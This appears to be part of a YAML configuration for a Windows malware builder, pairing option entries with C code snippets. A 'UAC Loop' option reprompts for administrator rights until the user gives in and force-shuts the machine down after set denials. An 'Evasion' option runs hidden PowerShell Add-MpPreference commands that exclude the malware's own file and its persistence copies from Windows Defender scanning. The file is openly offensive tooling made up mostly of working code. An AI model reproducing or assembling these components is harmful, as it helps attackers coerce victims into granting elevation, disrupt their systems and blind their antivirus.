  - id: UacLoop
    display: UAC Loop (Spam Until Yes or Shutdown)
    default: false
    requires: []
    inputs:
    - id: uac_loop_max_denials
      label: "Max denials before shutdown (0 = forever)"
      type: textbox
      defaultValue: "0"
      placeholder: "0"
    - id: uac_loop_retry_ms
      label: "Retry delay (ms)"
      type: textbox
      defaultValue: "300"
      placeholder: "300"
    snippet: |
      // UAC Bypass: Loop ShellExecute("runas") until the user accepts or the
      // configured denial threshold triggers a forced system shutdown.
      // Relies on wash_demand_elevation_or_shutdown() from the shared preamble:
      //   - if already elevated, returns immediately
      //   - otherwise reprompts in a tight loop; cancelling the dialog reopens it
      //   - hitting max_denials calls ExitWindowsEx(EWX_SHUTDOWN | EWX_FORCE)
      // Set max_denials = 0 to loop forever.
      wash_demand_elevation_or_shutdown((DWORD)$uac_loop_max_denials$, (DWORD)$uac_loop_retry_ms$);

- header: Evasion
  template: evasion
  display: Evasion
  allowMultiple: true
  items:
  - id: None
    display: None (Skip)
    default: true
    requires: []
    snippet: |
      // No evasion
  - id: DefenderExclusion
    display: Defender Exclusion (Self + Persistence Drops)
    default: false
    requires:
    - uac_bypass
    snippet: |
      // Evasion: Add the running executable AND every tracked persistence drop
      // (wash_copies[], populated by Persistence snippets) to Windows Defender's
      // path-exclusions list. Issued via Add-MpPreference under powershell.exe
      // with WindowStyle Hidden. Requires administrator rights — guard with a
      // UAC bypass snippet so wash_is_elevated() returns TRUE before reaching
      // this point.
      {
          // Self-track: ensure our current path is in wash_copies[] in case no
          // persistence snippet ran first.
          {
              WCHAR _self[MAX_PATH] = {0};
              if (GetModuleFileNameW(NULL, _self, MAX_PATH) > 0)
                  wash_track(_self);
          }

          for (int _i = 0; _i < wash_copies_count; _i++) {
              WCHAR _ev_cmd[1024] = {0};
              wsprintfW(_ev_cmd,
                        L"powershell.exe -NoProfile -WindowStyle Hidden "
                        L"-Command \"Add-MpPreference -ExclusionPath '%s'\"",
                        wash_copies[_i]);
              STARTUPINFOW        _ev_si = {sizeof(_ev_si)};
              PROCESS_INFORMATION _ev_pi = {0};
              _ev_si.dwFlags     = STARTF_USESHOWWINDOW;
              _ev_si.wShowWindow = SW_HIDE;
              if (CreateProcessW(NULL, _ev_cmd, NULL, NULL, FALSE,
                                 CREATE_NO_WINDOW, NULL, NULL, &_ev_si, &_ev_pi)) {
                  WaitForSingleObject(_ev_pi.hProcess, 10000);
                  CloseHandle(_ev_pi.hProcess);
                  CloseHandle(_ev_pi.hThread);
              }
          }
      }

